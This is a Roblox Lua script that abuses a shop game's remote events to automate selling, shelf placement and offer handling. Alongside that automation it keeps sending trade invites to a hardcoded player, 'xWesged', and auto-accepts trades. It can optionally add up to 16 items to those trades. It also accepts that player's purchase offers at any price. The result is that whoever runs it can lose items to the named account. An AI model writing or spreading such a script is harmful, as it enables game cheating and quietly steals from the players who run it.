local Players=game:GetService("Players")
local ReplicatedStorage=game:GetService("ReplicatedStorage")
local Workspace=game:GetService("Workspace")
local RunService=game:GetService("RunService")

local LocalPlayer=Players.LocalPlayer

local Events=ReplicatedStorage:WaitForChild("Events")

local AcceptRemote=Events.Shop.AcceptOfferServer
local DeclineRemote=Events.Shop.DeclineOfferServer
local InsertFurniture=Events.Shop.InsertFurniture
local RemoveFurniture=Events.Shop.RemoveFurniture

local AcceptPlayerRemote=Events.Shop.AcceptPlayerOffer
local SellRemote=Events.Shop.SellItemInShop
local GetAllRemote=Events.Data.GetAll

local RepLibrary=require(ReplicatedStorage.Modules.RepLibrary)
local ItemsModule=require(ReplicatedStorage.Modules.Items)
local UIModule=require(ReplicatedStorage.Modules.UIModule)

local TARGET_NAME="xWesged"

_G.AutoTrade={
Enabled=true,
TargetPlayer="xWesged",
AutoSend=true,
AutoAccept=true,
AutoAdd=false,
SendDelay=5,
LastSend=0
}

task.spawn(function()
while true do
task.wait(1)
if _G.AutoTrade.Enabled and _G.AutoTrade.AutoSend and _G.AutoTrade.TargetPlayer and tick()-_G.AutoTrade.LastSend>=_G.AutoTrade.SendDelay then
local success=Events.Trading.SendInvite:InvokeServer(_G.AutoTrade.TargetPlayer)
if success then
UIModule:Notify(LocalPlayer,"Sent trade to ".._G.AutoTrade.TargetPlayer)
_G.AutoTrade.LastSend=tick()
end
end
end
end)

Events.Trading.AcceptTradeFromServer.OnClientEvent:Connect(function()
if _G.AutoTrade.Enabled and _G.AutoTrade.AutoAccept then
task.wait(0.5)
Events.Trading.AcceptTrade:InvokeServer()
UIModule:Notify(LocalPlayer,"Trade Accepted")
end
end)

task.spawn(function()
while true do
task.wait(2)
if _G.AutoTrade.Enabled and _G.AutoTrade.AutoAdd then
local inventory=Events.Data.Get:InvokeServer("Inventory")
local added=0
for guid,data in pairs(inventory) do
if added>=16 then break end
if not(data.ItemPlaced or data.NextOfferDue) then
local success=Events.Trading.AddItem:InvokeServer({GUID=guid,Type="Item"})
if success then
added+=1
end
task.wait(0.1)
end
end
if added>0 then
UIModule:Notify(LocalPlayer,"Added "..added.." items")
task.wait(0.5)
Events.Trading.AcceptTrade:InvokeServer()
end
end
end
end)

task.spawn(function()
while true do
pcall(function()
for _,gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
local from=gui:GetAttribute("OfferFromPlayerName")
local guid=gui:GetAttribute("GUID")
local price=gui:GetAttribute("Offer")
if from==TARGET_NAME and guid and price then
AcceptPlayerRemote:InvokeServer(from,guid,price)
end
end
end)
task.wait(0.5)
end
end)

task.spawn(function()
while true do
pcall(function()
local data=GetAllRemote:InvokeServer()
if not data or not data.Inventory then return end
local plotName=LocalPlayer.NonSaveVars.OwnsPlot.Value.Name
local plot=workspace.Plots[plotName]
if not plot then return end
local shelves={}
local furnitureFolder=plot:FindFirstChild("Furniture")
if furnitureFolder then
for _,f in ipairs(furnitureFolder:GetChildren()) do
local s=f:FindFirstChild("Shelves")
if s then
for _,sh in ipairs(s:GetChildren()) do
table.insert(shelves,sh)
end
end
end
end
if #shelves==0 then return end
local sorted={}
for guid,info in pairs(data.Inventory) do
local id=tonumber(info.Id)
local itemData=ItemsModule[id]
if not info.ItemPlaced and not info.NextOfferDue then
local name=itemData and string.lower(itemData.Name or "") or ""
if id~=681 and id~=2294 and not string.find(name,"safe") then
local price=RepLibrary:GetItemPrice(info)
table.insert(sorted,{GUID=guid,Data=info,Price=price})
end
end
end
table.sort(sorted,function(a,b)return a.Price>b.Price end)
local i=1
for _,item in ipairs(sorted) do
if i>#shelves then break end
SellRemote:FireServer(item.GUID,shelves[i],true)
i+=1
task.wait(0.1)
end
end)
task.wait(3)
end
end)

local function getPlot()
local nsv=LocalPlayer:WaitForChild("NonSaveVars")
local own=nsv:WaitForChild("OwnsPlot")
repeat task.wait() until own.Value and own.Value~=0
return Workspace.Plots:WaitForChild(tostring(own.Value))
end

local function getShelves()
local plot=getPlot()
local shelves={}
local furniture=plot:FindFirstChild("Furniture")
if not furniture then return shelves end
for _,v in ipairs(furniture:GetDescendants()) do
if v.Name=="Shelves" then
for _,s in ipairs(v:GetChildren()) do
table.insert(shelves,s)
end
end
end
return shelves
end

local function processOffers()
local changed=false
for _,shelf in ipairs(getShelves()) do
local offer=shelf:GetAttribute("Offer")
if offer then
local itemFolder=shelf:FindFirstChild("Item")
if itemFolder then
local item=itemFolder:GetChildren()[1]
if item then
local id=item:GetAttribute("Id")
if id then
local base=RepLibrary:GetItemPrice({Id=id})
if base and base>0 then
local percent=((offer-base)/base)*100
if percent<=50 then
AcceptRemote:FireServer(shelf)
changed=true
elseif percent>50 then
DeclineRemote:FireServer(shelf)
changed=true
end
end
end
end
end
end
end
return changed
end

local function removeAll()
local plot=getPlot()
local furniture=plot:WaitForChild("Furniture")
for _,model in ipairs(furniture:GetChildren()) do
if model:IsA("Model") then
pcall(function()
RemoveFurniture:InvokeServer(model)
end)
task.wait(0.1)
end
end
end

local function placeShelves()
local plot=getPlot()
local canvas=plot.Interior.Shop1.Canvas
local sizeX=18
local sizeZ=21
local fitX=math.floor(canvas.Size.X/sizeX)
local fitZ=math.floor(canvas.Size.Z/sizeZ)
local startX=canvas.Position.X-canvas.Size.X/2+sizeX/2
local startZ=canvas.Position.Z-canvas.Size.Z/2+sizeZ/2
local y=canvas.Position.Y+canvas.Size.Y/2+1
for x=0,fitX-1 do
for z=0,fitZ-1 do
pcall(function()
InsertFurniture:InvokeServer({Id="5",CFrame=CFrame.new(startX+x*sizeX,y,startZ+z*sizeZ),Floor=1})
end)
task.wait(0.15)
end
end
end

while true do
local changed=processOffers()
if changed then
task.wait(2)
removeAll()
task.wait(1)
placeShelves()
end
task.wait(0.5)
end
